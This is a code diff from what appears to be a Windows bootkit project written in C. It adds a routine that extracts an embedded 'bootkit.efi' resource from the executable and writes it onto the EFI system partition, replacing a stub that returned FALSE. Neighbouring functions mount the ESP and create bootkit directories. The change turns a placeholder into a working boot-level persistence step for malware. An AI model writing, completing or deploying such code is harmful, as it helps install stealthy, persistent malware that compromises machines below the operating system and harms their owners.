@@ -9,6 +9,7 @@
 #include <string.h>
 #include <shlobj.h>
 #include <wchar.h>
+#include "../manager/resource.h"
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -134,7 +135,7 @@ BOOL BootkitMountEfiPartition(char driveLetter[4]) {
     }
     
     // Find EFI system partition (ESP) in output
-    // Format: \\?\Volume{GUID}\
+    // Format: \\?\Volume{GUID}
     char* espStart = strstr(output, "*** NO MOUNT POINTS ***");
     if (!espStart) {
         return FALSE;
@@ -242,21 +243,30 @@ static BOOL CreateBootkitDirectories(const char* efiDrive) {
     return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
 }
 
-// Write embedded EFI application (placeholder - would be embedded resource)
+// Write embedded EFI application
 BOOL BootkitCopyEfiApplication(const char* efiPartitionDrive) {
-    // In production, this would write the compiled EFI application
-    // from an embedded resource to the EFI partition
-    
-    // For now, return FALSE as we don't have the compiled EFI app
-    // This function would extract bootkit.efi from resources
-    
     char efiPath[MAX_PATH];
     sprintf_s(efiPath, sizeof(efiPath), "%s%s", efiPartitionDrive, EFI_BOOTKIT_APP);
     
-    // TODO: Extract EFI application from resources
-    // For now, this is a placeholder that requires manual EFI app creation
-    
-    return FALSE;  // Not implemented in this build
+    HMODULE hMod = GetModuleHandle(NULL);
+    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(IDR_BOOTKIT_EFI), RT_RCDATA);
+    if (!hRes) return FALSE;
+
+    HGLOBAL hData = LoadResource(hMod, hRes);
+    DWORD size = SizeofResource(hMod, hRes);
+    PVOID data = LockResource(hData);
+
+    if (!data || size == 0) return FALSE;
+
+    HANDLE hFile = CreateFileA(efiPath, GENERIC_WRITE, 0, NULL, 
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+
+    DWORD written = 0;
+    BOOL success = WriteFile(hFile, data, size, &written, NULL);
+    CloseHandle(hFile);
+
+    return success && (written == size);
 }
 
 // Write driver image to EFI partition
